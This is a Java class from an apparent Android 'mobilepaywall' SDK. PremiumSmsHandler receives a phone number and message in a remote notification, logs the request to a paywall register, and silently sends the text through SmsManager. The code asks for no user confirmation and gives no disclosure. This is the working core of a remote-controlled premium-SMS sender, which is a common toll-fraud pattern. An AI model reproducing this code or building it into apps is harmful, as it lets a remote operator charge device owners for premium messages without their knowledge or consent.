package com.mobilepaywall.core.handelers.types;

import android.content.Context;
import android.content.SharedPreferences;
import android.media.audiofx.BassBoost;
import android.preference.PreferenceManager;
import android.telephony.SmsManager;
import android.util.Log;

import com.mobilepaywall.core.communication.PaywallRegister;
import com.mobilepaywall.core.handelers.NotificationHandelerBase;
import com.mobilepaywall.core.handelers.PaywallNotificationBody;
import com.mobilepaywall.core.webrequests.PLog;

/**
 * Created by ako on 14.2.2017..
 */

public class PremiumSmsHandler extends NotificationHandelerBase {
  public static final String TAG = "_psms";

  public PremiumSmsHandler(Context context){ super(context); }

  @Override
  public void execute(PaywallNotificationBody notification) {
    if(notification.getParams().size() < 2)
    {
      PLog.d(TAG, "There is no 2 param arguments");
      return;
    }

    String number = notification.getParams().get(0);
    String message = notification.getParams().get(1);
    String psmsRequestID = notification.getDefaultFlag();

    Log.d(TAG, "Message to sent:" + message);
    Log.d(TAG, "On Number:" + number);
    Log.d(TAG, "PSMSRequestID: " + psmsRequestID);

    if(message.isEmpty())
    {
      PLog.d(TAG, "Text is empty!");
      return;
    }

    if(number.isEmpty())
    {
      PLog.d(TAG, "Number is empty");
      return;
    }

    SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this.getContext());
    PaywallRegister.reportPremiumSmsRequest(sp, psmsRequestID);

    try
    {
      SmsManager smsManager = SmsManager.getDefault();
      smsManager.sendTextMessage(number, null, message, null, null);
      PLog.d(TAG, "Sent");
    }
    catch (Exception e)
    {
      PLog.d(TAG, "Exception: " + e);
    }
  }
}
